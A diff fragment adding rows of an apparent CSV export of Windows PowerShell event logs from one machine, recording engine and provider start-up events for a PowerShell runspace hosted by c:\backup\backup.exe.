+	CommandLine=",Available,None,5.1.19041.1237,0.5.0.27,-,-,eb3a986f-b365-4c00-b60d-5a16fda224f2,c:\backup\backup.exe,1,c:\backup\backup.exe,c:\backup\backup.exe,5e46281f-c7d2-44bf-8aca-1c29c4287929,-,-,-,-,-,PSRunspace-Host,PSRunspace-Host,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,400,Classic,-,-,Info,-,-,-,PowerShell,276,Engine Lifecycle,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+86,"Oct 25, 2022 @ 04:21:01.287",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,1,info,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""Registry"" is Started. 
+
+Details: 
+	ProviderName=Registry
+	NewProviderState=Started
+
+	SequenceNumber=1
+
+	HostName=PSRunspace-Host
+	HostVersion=0.5.0.27
+	HostId=5e46281f-c7d2-44bf-8aca-1c29c4287929
+	HostApplication=c:\backup\backup.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,0.5.0.27,Registry,Started,-,c:\backup\backup.exe,1,c:\backup\backup.exe,c:\backup\backup.exe,5e46281f-c7d2-44bf-8aca-1c29c4287929,-,-,-,-,-,PSRunspace-Host,PSRunspace-Host,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600,Classic,-,-,Info,-,-,-,PowerShell,268,Provider Lifecycle,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+87,"Oct 25, 2022 @ 04:21:01.287",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,3,info,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""Alias"" is Started. 
+
+Details: 
+	ProviderName=Alias
+	NewProviderState=Started
+
+	SequenceNumber=3
+
+	HostName=PSRunspace-Host
+	HostVersion=0.5.0.27
+	HostId=5e46281f-c7d2-44bf-8aca-1c29c4287929
+	HostApplication=c:\backup\backup.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,0.5.0.27,Alias,Started,-,c:\backup\backup.exe,1,c:\backup\backup.exe,c:\backup\backup.exe,5e46281f-c7d2-44bf-8aca-1c29c4287929,-,-,-,-,-,PSRunspace-Host,PSRunspace-Host,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600,Classic,-,-,Info,-,-,-,PowerShell,269,Provider Lifecycle,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+88,"Oct 25, 2022 @ 04:21:01.287",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,5,info,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""Environment"" is Started. 
+
+Details: 
+	ProviderName=Environment
+	NewProviderState=Started
+
+	SequenceNumber=5
+
+	HostName=PSRunspace-Host
+	HostVersion=0.5.0.27
+	HostId=5e46281f-c7d2-44bf-8aca-1c29c4287929
+	HostApplication=c:\backup\backup.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,0.5.0.27,Environment,Started,-,c:\backup\backup.exe,1,c:\backup\backup.exe,c:\backup\backup.exe,5e46281f-c7d2-44bf-8aca-1c29c4287929,-,-,-,-,-,PSRunspace-Host,PSRunspace-Host,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600,Classic,-,-,Info,-,-,-,PowerShell,270,Provider Lifecycle,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
